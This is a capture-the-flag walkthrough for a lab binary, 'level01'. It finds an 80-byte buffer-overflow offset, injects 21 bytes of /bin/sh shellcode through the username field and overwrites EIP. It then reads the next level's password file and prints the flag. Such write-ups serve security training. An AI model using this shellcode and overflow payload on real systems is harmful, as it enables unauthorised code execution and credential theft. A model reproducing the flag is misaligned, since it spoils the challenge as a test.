Level01 - Shellcode Attack Solution

Input username: "dat_wil" + shellcode
Program calls verify_user_name()
Input password: [80 bytes 'A'] + "\x47\xa0\x04\x08"
EIP overwritten → Points to shellcode → Execute

Step 1: Find Offset

bash gdb ./level01
# Program received signal SIGSEGV
# EIP = 0x37634136
Use: https://wiremask.eu/tools/buffer-overflow-pattern-generator/
Offset = 80 bytes

Step 2: Shellcode (21 bytes)
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
Address: 0x0804a047 → \x47\xa0\x04\x08 (little-endian)

Step 3: Create Payload

bash python -c "print 'dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'A'*80 + '\x47\xa0\x04\x08'" > /tmp/payload

Step 4: Execute
bash cat /tmp/payload - | ./level01
Step 5: Get Flag

bash cat /home/users/level02/.pass
Flag
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv